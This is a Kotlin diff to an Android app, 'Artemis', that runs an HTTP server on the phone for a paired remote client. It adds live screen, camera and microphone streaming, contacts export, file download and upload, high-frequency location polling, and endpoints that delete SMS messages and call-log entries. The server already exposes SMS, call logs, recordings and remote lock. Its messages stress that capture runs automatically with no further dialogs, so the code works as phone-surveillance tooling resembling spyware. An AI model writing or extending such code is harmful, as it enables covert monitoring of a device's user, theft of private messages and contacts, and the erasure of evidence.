@@ -6,10 +6,15 @@ import com.example.artemis.auth.AuthManager
 import com.example.artemis.auth.PairedClient
 import com.example.artemis.auth.PairingCode
 import com.example.artemis.auth.RefreshSessionResult
+import com.example.artemis.feature.BatteryHelper
 import com.example.artemis.feature.CameraController
+import com.example.artemis.feature.CameraFeedController
+import com.example.artemis.feature.ContactsProvider
 import com.example.artemis.feature.DeviceInfoProvider
+import com.example.artemis.feature.FileSystemHelper
 import com.example.artemis.feature.LocationTracker
 import com.example.artemis.feature.MicController
+import com.example.artemis.feature.ScreenCaptureController
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -52,7 +57,14 @@ data class HttpResponse(
     val contentType: String = "application/json",
     val headers: Map<String, String> = emptyMap(),
     val body: String = "",
-    val binaryBody: ByteArray? = null
+    val binaryBody: ByteArray? = null,
+    /**
+     * Live-streaming body (v2.3.0 video-call): when set, the server writes
+     * the response head (no Content-Length) and then runs this suspend
+     * block with the raw socket OutputStream until it returns or the client
+     * disconnects. Used for MJPEG screen/camera feeds and raw PCM mic.
+     */
+    val streamBody: (suspend (OutputStream) -> Unit)? = null
 )
 
 data class Route(
@@ -144,6 +156,11 @@ class SimpleHttpServer(
     private val smsProvider: com.example.artemis.feature.SmsProvider,
     private val callRecorder: com.example.artemis.feature.CallRecorder,
     private val videoRecorder: com.example.artemis.feature.VideoRecorder,
+    private val cameraFeedController: CameraFeedController,
+    private val screenCaptureController: ScreenCaptureController,
+    private val fileSystemHelper: FileSystemHelper,
+    private val contactsProvider: ContactsProvider,
+    private val batteryHelper: BatteryHelper,
     private val port: Int = 8443,
     private val useTls: Boolean = true
 ) {
@@ -240,6 +257,18 @@ class SimpleHttpServer(
         router.get("/api/v1/mic/recordings/{id}") { requireAuth(it) { req -> micRecordingGetHandler(req) } }
         router.get("/api/v1/mic/recordings/{id}/file") { requireAuth(it) { req -> micRecordingFileHandler(req) } }
 
+        // Battery (v2.3.0 helper — dashboard live-view header)
+        router.get("/api/v1/battery") { requireAuth(it) { req -> batteryHandler(req) } }
+
+        // SMS / call-log deletion (v2.3.0)
+        router.post("/api/v1/sms/delete") { requireAuth(it) { req -> smsDeleteHandler(req) } }
+        router.post("/api/v1/logs/calls/delete") { requireAuth(it) { req -> callLogsDeleteHandler(req) } }
+
+        // Live streams (v2.3.0 video-call): MJPEG screen/camera + raw PCM mic
+        router.get("/api/v1/stream/screen") { requireAuth(it) { req -> screenStreamHandler(req) } }
+        router.get("/api/v1/stream/camera") { requireAuth(it) { req -> cameraStreamHandler(req) } }
+        router.get("/api/v1/stream/mic") { requireAuth(it) { req -> micStreamHandler(req) } }
+
         // Call logs (READ_CALL_LOG)
         router.get("/api/v1/logs/calls") { requireAuth(it) { req -> callLogsHandler(req) } }
 
@@ -258,6 +287,26 @@ class SimpleHttpServer(
         router.get("/api/v1/video/list") { requireAuth(it) { req -> videoListHandler(req) } }
         router.get("/api/v1/video/{id}") { requireAuth(it) { req -> videoGetHandler(req) } }
         router.get("/api/v1/video/{id}/file") { requireAuth(it) { req -> videoFileHandler(req) } }
+
+        // Camera feed (v2.3.0 helper — repeating capture, latest-frame pull)
+        router.post("/api/v1/camera/feed/start") { requireAuth(it) { req -> cameraFeedStartHandler(req) } }
+        router.post("/api/v1/camera/feed/stop") { requireAuth(it) { req -> cameraFeedStopHandler(req) } }
+        router.get("/api/v1/camera/feed/status") { requireAuth(it) { req -> cameraFeedStatusHandler(req) } }
+        router.get("/api/v1/camera/feed/latest") { requireAuth(it) { req -> cameraFeedLatestHandler(req) } }
+
+        // Screen capture (v2.3.0 helper — MediaProjection consent, on-demand JPEG)
+        router.get("/api/v1/screen/status") { requireAuth(it) { req -> screenStatusHandler(req) } }
+        router.post("/api/v1/screen/capture") { requireAuth(it) { req -> screenCaptureHandler(req) } }
+        router.post("/api/v1/screen/stop") { requireAuth(it) { req -> screenStopHandler(req) } }
+
+        // Files / assets (v2.3.0 helper — whitelisted-root list/download/upload)
+        router.get("/api/v1/files/roots") { requireAuth(it) { req -> filesRootsHandler(req) } }
+        router.get("/api/v1/files/list") { requireAuth(it) { req -> filesListHandler(req) } }
+        router.get("/api/v1/files/download") { requireAuth(it) { req -> filesDownloadHandler(req) } }
+        router.post("/api/v1/files/upload") { requireAuth(it) { req -> filesUploadHandler(req) } }
+
+        // Contacts (v2.3.0 helper — READ_CONTACTS)
+        router.get("/api/v1/contacts") { requireAuth(it) { req -> contactsHandler(req) } }
 
         // Device admin — remote lock (requires active device admin)
         router.post("/api/v1/admin/lock") { requireAuth(it) { req -> adminLockHandler(req) } }
@@ -304,7 +353,7 @@ class SimpleHttpServer(
     private fun healthHandler(req: HttpRequest): HttpResponse {
         return jsonResponse(200, mapOf(
             "status" to "ok",
-            "version" to "2.2.0",
+            "version" to "2.3.0",
             "deviceName" to android.os.Build.MODEL,
             "uptimeSeconds" to ((System.currentTimeMillis() - startTime) / 1000),
             "activeConnections" to activeConnections,
@@ -601,7 +650,10 @@ class SimpleHttpServer(
     }
 
     private fun locationCurrentHandler(req: HttpRequest): HttpResponse {
-        val location = runBlocking { locationTracker.getCurrentLocation() }
+        // ?fresh=1 bypasses the 30s cache — a higher-frequency poll variant
+        // for the dashboard map / live tracking.
+        val forceFresh = req.queryParams["fresh"] == "1" || req.queryParams["fresh"] == "true"
+        val location = runBlocking { locationTracker.getCurrentLocation(forceFresh = forceFresh) }
         if (location != null) {
             val body = json.encodeToString(location)
             return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), body)
@@ -865,6 +917,374 @@ class SimpleHttpServer(
     }
 
     // ============================================================
+    // Camera feed (v2.3.0 helper)
+    // ============================================================
+
+    private fun cameraFeedStartHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val intervalMs = body?.get("intervalMs")?.toLongOrNull() ?: 2000L
+        val durationMs = body?.get("durationMs")?.toLongOrNull() ?: 0L
+        val cameraId = body?.get("cameraId") ?: "back"
+
+        val started = cameraFeedController.start(intervalMs, durationMs, cameraId)
+        if (!started) {
+            return jsonResponse(409, mapOf(
+                "error" to "already_active",
+                "message" to "A camera feed is already running — stop it first"
+            ))
+        }
+        val status = cameraFeedController.status()
+        return jsonResponse(200, mapOf(
+            "status" to "started",
+            "intervalMs" to status.intervalMs,
+            "durationMs" to status.durationMs,
+            "cameraId" to status.cameraId
+        ))
+    }
+
+    private fun cameraFeedStopHandler(req: HttpRequest): HttpResponse {
+        cameraFeedController.stop()
+        return jsonResponse(200, mapOf("status" to "stopped"))
+    }
+
+    private fun cameraFeedStatusHandler(req: HttpRequest): HttpResponse {
+        val status = cameraFeedController.status()
+        return jsonResponse(200, mapOf(
+            "active" to status.active,
+            "intervalMs" to status.intervalMs,
+            "durationMs" to status.durationMs,
+            "startedAt" to status.startedAt,
+            "framesCaptured" to status.framesCaptured,
+            "lastFrameAt" to (status.lastFrameAt ?: 0L),
+            "cameraId" to status.cameraId
+        ))
+    }
+
+    private fun cameraFeedLatestHandler(req: HttpRequest): HttpResponse {
+        val frame = cameraFeedController.latestFrame()
+        if (frame == null) {
+            return jsonResponse(409, mapOf(
+                "error" to "no_frame",
+                "message" to "No frame captured yet — start the feed and wait for the first capture"
+            ))
+        }
+        return HttpResponse(
+            200,
+            contentType = "image/jpeg",
+            headers = mapOf(
+                "Access-Control-Allow-Origin" to "*",
+                "Cache-Control" to "no-store"
+            ),
+            binaryBody = frame
+        )
+    }
+
+    // ============================================================
+    // Screen capture (v2.3.0 helper)
+    // ============================================================
+
+    private fun screenStatusHandler(req: HttpRequest): HttpResponse {
+        return jsonResponse(200, mapOf(
+            "enabled" to screenCaptureController.isEnabled,
+            "active" to screenCaptureController.isActive,
+            "method" to screenCaptureController.method
+        ))
+    }
+
+    private fun screenCaptureHandler(req: HttpRequest): HttpResponse {
+        if (!screenCaptureController.isEnabled) {
+            return jsonResponse(409, mapOf(
+                "error" to "capture_unavailable",
+                "message" to "No screen capture backend enabled. Open the Artemis app on the phone once and tap 'ENABLE SCREEN CAPTURE' — a one-time Settings enable, then captures are fully automatic."
+            ))
+        }
+        val frame = screenCaptureController.captureFrame()
+        if (frame == null) {
+            return jsonResponse(500, mapOf("error" to "capture_failed", "message" to "Could not capture the screen (screen may be off / locked)"))
+        }
+        return HttpResponse(
+            200,
+            contentType = "image/jpeg",
+            headers = mapOf("Access-Control-Allow-Origin" to "*", "Cache-Control" to "no-store"),
+            binaryBody = frame
+        )
+    }
+
+    private fun screenStopHandler(req: HttpRequest): HttpResponse {
+        screenCaptureController.stop()
+        return jsonResponse(200, mapOf("status" to "stopped"))
+    }
+
+    // ============================================================
+    // Battery, delete ops, live streams (v2.3.0 video-call)
+    // ============================================================
+
+    private fun batteryHandler(req: HttpRequest): HttpResponse {
+        val info = batteryHelper.read()
+        return jsonResponse(200, mapOf(
+            "levelPercent" to info.levelPercent,
+            "isCharging" to info.isCharging,
+            "chargeSource" to info.chargeSource,
+            "status" to info.status,
+            "health" to info.health,
+            "temperatureC" to info.temperatureC,
+            "voltageMv" to info.voltageMv,
+            "technology" to info.technology,
+            "plugged" to info.plugged
+        ))
+    }
+
+    private fun smsDeleteHandler(req: HttpRequest): HttpResponse {
+        val id = req.queryParams["id"]?.toLongOrNull()
+            ?: parseJsonObject(req.body)?.get("id")?.toLongOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing message id"))
+        val result = runBlocking { smsProvider.deleteSms(id) }
+        return result.fold(
+            onSuccess = { jsonResponse(200, mapOf("status" to "deleted", "id" to id)) },
+            onFailure = { e ->
+                val blocked = e is SecurityException
+                jsonResponse(if (blocked) 403 else 404, mapOf(
+                    "error" to if (blocked) "permission_denied" else "not_found",
+                    "message" to (e.message ?: "Delete failed")
+                ))
+            }
+        )
+    }
+
+    private fun callLogsDeleteHandler(req: HttpRequest): HttpResponse {
+        val id = req.queryParams["id"]?.toLongOrNull()
+            ?: parseJsonObject(req.body)?.get("id")?.toLongOrNull()
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing call log id"))
+        val result = runBlocking { callLogsProvider.deleteCallLog(id) }
+        return result.fold(
+            onSuccess = { jsonResponse(200, mapOf("status" to "deleted", "id" to id)) },
+            onFailure = { e ->
+                val blocked = e is SecurityException
+                jsonResponse(if (blocked) 403 else 404, mapOf(
+                    "error" to if (blocked) "permission_denied" else "not_found",
+                    "message" to (e.message ?: "Delete failed")
+                ))
+            }
+        )
+    }
+
+    private fun screenStreamHandler(req: HttpRequest): HttpResponse {
+        if (!screenCaptureController.isEnabled) {
+            return jsonResponse(409, mapOf(
+                "error" to "capture_unavailable",
+                "message" to "Screen capture not enabled — open the Artemis app once and tap ENABLE (one-time, no dialogs after)"
+            ))
+        }
+        val intervalMs = req.queryParams["intervalMs"]?.toLongOrNull()?.coerceIn(150L, 5000L) ?: 250L
+        val quality = req.queryParams["quality"]?.toIntOrNull()?.coerceIn(30, 95) ?: 70
+        return HttpResponse(
+            200,
+            contentType = "multipart/x-mixed-replace; boundary=frame",
+            headers = mapOf("Cache-Control" to "no-store"),
+            streamBody = { out ->
+                writeMpegFrames(out, intervalMs) {
+                    screenCaptureController.captureFrame()
+                }
+            }
+        )
+    }
+
+    private fun cameraStreamHandler(req: HttpRequest): HttpResponse {
+        val camera = req.queryParams["camera"] ?: "front"
+        val lensFacing = if (camera == "back" || camera == "0") {
+            androidx.camera.core.CameraSelector.LENS_FACING_BACK
+        } else {
+            androidx.camera.core.CameraSelector.LENS_FACING_FRONT
+        }
+        val intervalMs = req.queryParams["intervalMs"]?.toLongOrNull()?.coerceIn(150L, 5000L) ?: 400L
+        val quality = req.queryParams["quality"]?.toIntOrNull()?.coerceIn(30, 95) ?: 55
+        return HttpResponse(
+            200,
+            contentType = "multipart/x-mixed-replace; boundary=frame",
+            headers = mapOf("Cache-Control" to "no-store"),
+            streamBody = { out ->
+                writeMpegFrames(out, intervalMs) {
+                    runBlocking {
+                        cameraController.captureFrame(lensFacing, maxDimension = 960, quality = quality)
+                    }
+                }
+            }
+        )
+    }
+
+    private fun micStreamHandler(req: HttpRequest): HttpResponse {
+        val channel = micController.startLiveStream()
+            ?: return jsonResponse(409, mapOf(
+                "error" to "mic_busy",
+                "message" to "Mic unavailable (permission missing or a file recording is active)"
+            ))
+        return HttpResponse(
+            200,
+            contentType = "application/octet-stream",
+            headers = mapOf(
+                "Cache-Control" to "no-store",
+                "X-Audio-Format" to "pcm16-mono-44100"
+            ),
+            streamBody = { out ->
+                try {
+                    for (chunk in channel) {
+                        out.write(chunk)
+                        out.flush()
+                    }
+                } catch (e: Exception) {
+                    // Client disconnected — the write failed; stop the stream.
+                } finally {
+                    micController.stopLiveStream(channel)
+                }
+            }
+        )
+    }
+
+    /**
+     * Shared MJPEG writer: pushes JPEG frames as multipart parts until the
+     * client disconnects (write throws), the frame source fails too many
+     * times in a row, or the coroutine is cancelled. Frames are captured
+     * under the process camera mutex where applicable (single camera).
+     */
+    private suspend fun writeMpegFrames(
+        out: OutputStream,
+        intervalMs: Long,
+        frameSource: () -> ByteArray?
+    ) {
+        val boundary = "--frame"
+        var consecutiveFailures = 0
+        try {
+            while (true) {
+                val frame = try { frameSource() } catch (e: Exception) {
+                    Log.w("ArtemisServer", "Stream frame error: ${e.message}")
+                    null
+                }
+                if (frame == null) {
+                    consecutiveFailures++
+                    if (consecutiveFailures >= 20) break // ~10s of dead source
+                    delay(500)
+                    continue
+                }
+                consecutiveFailures = 0
+                out.write("$boundary\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray(Charsets.UTF_8))
+                out.write(frame)
+                out.write("\r\n".toByteArray(Charsets.UTF_8))
+                out.flush()
+                delay(intervalMs)
+            }
+        } catch (e: Exception) {
+            // Client disconnect or socket error — normal stream end.
+            Log.i("ArtemisServer", "MJPEG stream ended: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    // Files / assets (v2.3.0 helper)
+    // ============================================================
+
+    private fun filesRootsHandler(req: HttpRequest): HttpResponse {
+        return jsonResponse(200, mapOf("roots" to fileSystemHelper.allowedRoots()))
+    }
+
+    private fun filesListHandler(req: HttpRequest): HttpResponse {
+        val path = req.queryParams["path"]
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing path query parameter"))
+        val entries = fileSystemHelper.listDirectory(path)
+        if (entries == null) {
+            return jsonResponse(403, mapOf(
+                "error" to "forbidden",
+                "message" to "Path is outside the allowed roots or not a readable directory"
+            ))
+        }
+        val entriesJson = json.encodeToString(entries)
+        val rootsJson = json.encodeToString(fileSystemHelper.allowedRoots())
+        val body = """{"path":${toJsonValue(path)},"entries":$entriesJson,"count":${entries.size},"roots":$rootsJson}"""
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), body)
+    }
+
+    private fun filesDownloadHandler(req: HttpRequest): HttpResponse {
+        val path = req.queryParams["path"]
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing path query parameter"))
+        val file = fileSystemHelper.resolveFile(path)
+        if (file == null) {
+            return jsonResponse(404, mapOf(
+                "error" to "not_found",
+                "message" to "File not found or outside the allowed roots"
+            ))
+        }
+        return binaryFileResponse(file, mimeTypeFor(file.name))
+    }
+
+    private fun filesUploadHandler(req: HttpRequest): HttpResponse {
+        val path = req.queryParams["path"]
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing path query parameter"))
+        val body = parseJsonObject(req.body)
+        val dataB64 = body?.get("data")
+            ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing base64 'data' field in JSON body"))
+        val data = try {
+            android.util.Base64.decode(dataB64, android.util.Base64.DEFAULT)
+        } catch (e: Exception) {
+            return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Invalid base64 data"))
+        }
+        val result = fileSystemHelper.writeFile(path, data)
+        if (result.isFailure) {
+            return jsonResponse(403, mapOf(
+                "error" to "forbidden",
+                "message" to (result.exceptionOrNull()?.message ?: "Write failed")
+            ))
+        }
+        val written = result.getOrThrow()
+        return jsonResponse(200, mapOf(
+            "status" to "ok",
+            "path" to written.absolutePath,
+            "size" to written.length()
+        ))
+    }
+
+    /** Simple content-type guess for file downloads. */
+    private fun mimeTypeFor(name: String): String {
+        return when (name.substringAfterLast('.', "").lowercase()) {
+            "jpg", "jpeg" -> "image/jpeg"
+            "png" -> "image/png"
+            "gif" -> "image/gif"
+            "webp" -> "image/webp"
+            "mp4" -> "video/mp4"
+            "webm" -> "video/webm"
+            "3gp" -> "video/3gpp"
+            "wav" -> "audio/wav"
+            "mp3" -> "audio/mpeg"
+            "m4a" -> "audio/mp4"
+            "amr" -> "audio/amr"
+            "txt", "log", "md" -> "text/plain"
+            "json" -> "application/json"
+            "xml" -> "application/xml"
+            "pdf" -> "application/pdf"
+            "zip" -> "application/zip"
+            "apk" -> "application/vnd.android.package-archive"
+            "db" -> "application/octet-stream"
+            else -> "application/octet-stream"
+        }
+    }
+
+    // ============================================================
+    // Contacts (v2.3.0 helper)
+    // ============================================================
+
+    private fun contactsHandler(req: HttpRequest): HttpResponse {
+        val limit = req.queryParams["limit"]?.toIntOrNull() ?: 500
+        val contacts = contactsProvider.getContacts(limit.coerceIn(1, 2000))
+        if (contacts == null) {
+            return jsonResponse(403, mapOf(
+                "error" to "permission_denied",
+                "permission" to "READ_CONTACTS"
+            ))
+        }
+        val contactsJson = json.encodeToString(contacts)
+        val body = """{"contacts":$contactsJson,"count":${contacts.size}}"""
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), body)
+    }
+
+    // ============================================================
     // Response builders
     // ============================================================
 
@@ -1035,7 +1455,7 @@ class SimpleHttpServer(
         }
     }
 
-    private fun handleConnection(client: Socket) {
+    private suspend fun handleConnection(client: Socket) {
         try {
             client.soTimeout = 15000 // 15s timeout for reading
             val input = BufferedReader(InputStreamReader(client.getInputStream(), Charsets.UTF_8))
@@ -1069,6 +1489,15 @@ class SimpleHttpServer(
 
             if (response.statusCode == 404) {
                 Log.i("ArtemisServer", "<- 404 ${request.method} ${request.path}")
+            }
+
+            // Live-stream response: write the head without a Content-Length,
+            // then let the handler push frames until the client disconnects.
+            if (response.streamBody != null) {
+                sendStreamHead(output, response)
+                response.streamBody!!.invoke(output)
+                Log.i("ArtemisServer", "<- stream ended ${request.method} ${request.path}")
+                return
             }
 
             // Send the response
@@ -1161,6 +1590,33 @@ class SimpleHttpServer(
         }
     }
 
+    /** Response head for a live stream — no Content-Length, Connection: close. */
+    private fun sendStreamHead(output: OutputStream, response: HttpResponse) {
+        try {
+            val statusText = when (response.statusCode) {
+                200 -> "OK"
+                401 -> "Unauthorized"
+                404 -> "Not Found"
+                else -> "Unknown"
+            }
+            val headerLines = StringBuilder()
+            headerLines.append("HTTP/1.1 ${response.statusCode} $statusText\r\n")
+            headerLines.append("Content-Type: ${response.contentType}\r\n")
+            headerLines.append("Cache-Control: no-store\r\n")
+            headerLines.append("Connection: close\r\n")
+            headerLines.append("Access-Control-Allow-Origin: *\r\n")
+            for ((key, value) in response.headers) {
+                headerLines.append("$key: $value\r\n")
+            }
+            headerLines.append("Server: Artemis/2.3.0\r\n")
+            headerLines.append("\r\n")
+            output.write(headerLines.toString().toByteArray(Charsets.UTF_8))
+            output.flush()
+        } catch (e: Exception) {
+            Log.e("ArtemisServer", "Error sending stream head: ${e.message}")
+        }
+    }
+
     private fun sendHttpResponse(output: OutputStream, response: HttpResponse) {
         try {
             val bodyBytes = response.binaryBody ?: response.body.toByteArray(Charsets.UTF_8)
@@ -1188,7 +1644,7 @@ class SimpleHttpServer(
             for ((key, value) in response.headers) {
                 headerLines.append("$key: $value\r\n")
             }
-            headerLines.append("Server: Artemis/2.2.0\r\n")
+            headerLines.append("Server: Artemis/2.3.0\r\n")
             headerLines.append("\r\n")
 
             output.write(headerLines.toString().toByteArray(Charsets.UTF_8))
